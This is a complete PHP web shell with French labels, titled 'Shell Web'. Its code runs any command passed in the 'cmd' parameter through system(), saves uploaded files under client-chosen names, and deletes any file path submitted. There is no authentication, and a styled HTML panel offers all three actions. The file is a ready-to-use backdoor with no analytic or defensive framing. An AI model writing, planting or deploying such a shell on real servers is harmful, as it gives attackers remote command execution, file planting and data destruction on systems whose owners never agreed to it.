<?php
// Execution de commandes
if (isset($_REQUEST["cmd"])) {
	echo "<pre class='output'>";
	system($_REQUEST["cmd"]);
	echo "</pre>";
}

// Upload de fichiers
if (isset($_FILES["file"])) {
	if (move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) {
		echo "<div class='success'>Fichier uploadé : " . htmlspecialchars($_FILES["file"]["name"]) . "</div>";
	} else {
		echo "<div class='error'>Échec de l'upload</div>";
	}
}

// Suppression de fichiers
if (isset($_REQUEST['delete'])) {
	if (unlink($_REQUEST['delete'])) {
		echo "<div class='success'>Fichier supprimé : " . htmlspecialchars($_REQUEST['delete']) . "</div>";
	} else {
		echo "<div class='error'>Erreur de suppression</div>";
	}
}
?>

<!DOCTYPE html>
<html>

<head>
	<title>Shell Web</title>
	<style>
		body {
			font-family: Arial, sans-serif;
			max-width: 800px;
			margin: 0 auto;
			padding: 20px;
			background-color: #f5f5f5;
		}

		.box {
			background: white;
			padding: 20px;
			margin-bottom: 20px;
			border-radius: 5px;
			box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
		}

		h2 {
			margin-top: 0;
			color: #333;
		}

		input[type="text"],
		input[type="file"] {
			width: 100%;
			padding: 8px;
			margin: 5px 0;
			box-sizing: border-box;
		}

		input[type="submit"] {
			background: #4CAF50;
			color: white;
			border: none;
			padding: 10px 15px;
			cursor: pointer;
		}

		input[type="submit"]:hover {
			background: #45a049;
		}

		.output {
			background: #222;
			color: #0f0;
			padding: 10px;
			overflow-x: auto;
		}

		.success {
			color: green;
			padding: 5px;
		}

		.error {
			color: red;
			padding: 5px;
		}
	</style>
</head>

<body>
	<div class="box">
		<h2>Exécution de commandes</h2>
		<form method="POST">
			<input type="text" name="cmd" placeholder="whoami" required>
			<input type="submit" value="Exécuter">
		</form>
	</div>

	<div class="box">
		<h2>Upload de fichier</h2>
		<form method="POST" enctype="multipart/form-data">
			<input type="file" name="file" required>
			<input type="submit" value="Uploader">
		</form>
	</div>

	<div class="box">
		<h2>Suppression de fichier</h2>
		<form method="POST">
			<input type="text" name="delete" placeholder="/chemin/vers/fichier" required>
			<input type="submit" value="Supprimer">
		</form>
	</div>
</body>

</html>